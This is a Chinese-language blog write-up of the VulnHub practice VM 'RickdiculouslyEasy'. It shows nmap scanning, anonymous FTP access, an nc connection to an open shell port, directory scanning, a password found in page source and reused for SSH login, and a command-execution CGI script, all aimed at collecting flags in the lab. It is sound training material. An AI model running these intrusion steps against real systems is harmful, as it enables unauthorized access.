---
layout:     post
title:      Rickdiculously Easy靶场记录
subtitle:   
date:       2023-12-15
author:     Kody Black
header-img: img/post-bg-normal.jpg
catalog: true
tags:
    - web
---

[Rickdicu louslyEasy: 1 ](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)应该算是vulnhub上面的经典靶场，简单记录下整个过程

## 安装使用

由于vulnhub上面的靶场好像大部分都是Vbox的，VMware上面不好弄（试了下安装有点问题），所以直接下载了Vbox并打开。

注意网络配置，靶场的网卡设置连接方式为仅主机。

![17026505703591702650569538.png](https://fastly.jsdelivr.net/gh/distiny-cool/pictures@main/images/17026505703591702650569538.png)

打开VMware虚拟网络编辑器，管理员权限设置VMnet0（桥接模式的VMnet）外部连接为VirtualBox Host-Onlyt Adapter。

攻击机（我是用VMware上面的kali）添加一个新的网卡，设置为桥接模式。 

此时，攻击机就可以ping通靶机了！

## 渗透测试实践

### 扫描

sudo nmap -sT -A -p1-65535 -T4 -O -sV 192.168.211.138

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 22:07 EST
Nmap scan report for 192.168.56.101
Host is up (0.0070s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
22/tcp    open  ssh?
| fingerprint-strings:
|   NULL:
|_    Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http       Apache httpd 2.4.27 ((Fedora))
|_http-server-header: Apache/2.4.27 (Fedora)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Morty's Website
9090/tcp  open  http       Cockpit web service 161 or earlier
|_http-title: Did not follow redirect to https://192.168.56.101:9090/
13337/tcp open  unknown
| fingerprint-strings:
|   NULL:
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
22222/tcp open  ssh        OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 b411567fc036967cd099dd539522974f (RSA)
|   256 2067edd93988f9ed0daf8c8e8a456e0e (ECDSA)
|_  256 a684fa0fdfe0dce29a2de7133ce750a9 (ED25519)
60000/tcp open  tcpwrapped
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.93%I=7%D=12/14%Time=657BC31C%P=x86_64-pc-linux-gnu%r(NUL
SF:L,42,"Welcome\x20to\x20Ubuntu\x2014\.04\.5\x20LTS\x20\(GNU/Linux\x204\.
SF:4\.0-31-generic\x20x86_64\)\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port13337-TCP:V=7.93%I=7%D=12/14%Time=657BC31C%P=x86_64-pc-linux-gnu%r(
SF:NULL,29,"FLAG:{TheyFoundMyBackDoorMorty}-10Points\n");
MAC Address: 08:00:27:BF:52:95 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   7.01 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.58 seconds
```

### flag1 

```
13337/tcp open  unknown
| fingerprint-strings:
|   NULL:
|_    FLAG:{TheyFoundMyBackDoorMorty}-10Points
```

直接根据扫描结果，可以看到有一个13337端口的服务，下面显示出了第一个flag

### flag2

```
21/tcp    open  ftp        vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
|_drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
```

ftp服务开启了匿名访问，通过匿名访问下载

```bash
$ ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 3.0.3)
Name (192.168.56.101:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||35098|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              42 Aug 22  2017 FLAG.txt
drwxr-xr-x    2 0        0               6 Feb 12  2017 pub
226 Directory send OK.
ftp> get FLAG.txt
local: FLAG.txt remote: FLAG.txt
229 Entering Extended Passive Mode (|||56985|)
150 Opening BINARY mode data connection for FLAG.txt (42 bytes).
100% |***************************************************************************************************************|    42       16.03 KiB/s    00:00 ETA
226 Transfer complete.
42 bytes received in 00:00 (6.61 KiB/s)

$ cat FLAG.txt
FLAG{Whoa this is unexpected} - 10 Points
```

### flag3

```
9090/tcp  open  http       Cockpit web service 161 or earlier
|_http-title: Did not follow redirect to https://192.168.56.101:9090/
```

9090端口有一个http服务，浏览器访问即可看到一个flag

FLAG{THERE IS NO ZEUS, IN YOUR FACE!} - 10 POINTS

### flag4

```
60000/tcp open  tcpwrapped
```

tcpwrapped是一种保护程序，用来防止未经授权的访问。在nmap中看到tcpwrapped服务，这意味着TCP握手已经完成，但是远程主机在没有接收任何数据的情况下关闭了连接。

使用nc连接该端口，可以直接获得一个shell，读取到一个flag

```
$ nc 192.168.56.101 60000
Welcome to Ricks half baked reverse shell...
# ls
FLAG.txt
# cat FLAG.txt
FLAG{Flip the pickle Morty!} - 10 Points
```

### flag5

80端口有一个http服务，进去是一张Rick的图片，用dirBuster扫一下目录，发现有`/passwords`目录，进去后看到flag文件。 FLAG{Yeah d- just don't do it.} - 10 Points

### flag6

对目标进行目录扫描

```bash
$ dirsearch -u 192.168.56.101                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/_192.168.56.101/_23-12-15_22-11-59.txt

Target: http://192.168.56.101/

[22:11:59] Starting:                                                                                                                                                                                                                       
[22:12:03] 403 -  220B  - /.ht_wsr.txt                                      
[22:12:03] 403 -  223B  - /.htaccess.bak1                                   
[22:12:03] 403 -  223B  - /.htaccess.orig                                   
[22:12:03] 403 -  223B  - /.htaccess.save                                   
[22:12:03] 403 -  225B  - /.htaccess.sample
[22:12:03] 403 -  224B  - /.htaccess_extra                                  
[22:12:03] 403 -  223B  - /.htaccess_orig                                   
[22:12:03] 403 -  221B  - /.htaccess_sc                                     
[22:12:03] 403 -  221B  - /.htaccessOLD                                     
[22:12:03] 403 -  222B  - /.htaccessOLD2
[22:12:03] 403 -  213B  - /.htm                                             
[22:12:03] 403 -  221B  - /.htaccessBAK
[22:12:03] 403 -  223B  - /.htpasswd_test                                   
[22:12:03] 403 -  219B  - /.htpasswds                                       
[22:12:03] 403 -  214B  - /.html                                            
[22:12:03] 403 -  220B  - /.httr-oauth                                      
[22:12:33] 403 -  217B  - /cgi-bin/                                         
[22:13:09] 301 -  240B  - /passwords  ->  http://192.168.56.101/passwords/  
[22:13:09] 200 -    1KB - /passwords/                                       
[22:13:20] 200 -  126B  - /robots.txt                                       
                                                                             
Task Completed    
```

发现有passwords和robots.txt返回200（注意：403有时候也不能放过）

访问passwords，发现FLAG{Yeah d- just don't do it.} - 10 Points

### flag7

另外，还有http://192.168.56.101/passwords/passwords.html页面，查看其源码，发现了

`<!--Password: winter-->`

查看robots.txt，发现如下内容：

```
They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

访问/cgi-bin/root_shell.cgi，发现存在命令执行漏洞：

<img src="https://fastly.jsdelivr.net/gh/distiny-cool/pictures@main/images/17026974732441702697473075.png" alt="17026974732441702697473075.png"  />

发现有用户Summer，联系到之前的的密码winter，怀疑应该是配对的。

之前扫到了两个ssh端口，22和22222，发现使用22222端口可以成功访问，获得flag

```bash
ssh Summer@192.168.56.101 -p 22222
Summer@192.168.56.101's password:
client_global_hostkeys_private_confirm: server gave bad signature for RSA key 0
Last login: Thu Dec 14 17:28:05 2023
[Summer@localhost ~]$ ls
FLAG.txt
[Summer@localhost ~]$ cat FLAG.txt
                         _
                        | \
                        | |
                        | |
   |\                   | |
  /, ~\                / /
 X     `-.....-------./ /
  ~-. ~  ~              |
     \             /    |
      \  /_     ___\   /
      | /\ ~~~~~   \  |
      | | \        || |
      | |\ \       || )
     (_/ (_/      ((_/

[Summer@localhost ~]$ more FLAG.txt
FLAG{Get off the high road Summer!} - 10 Point
```

### 待续。。。
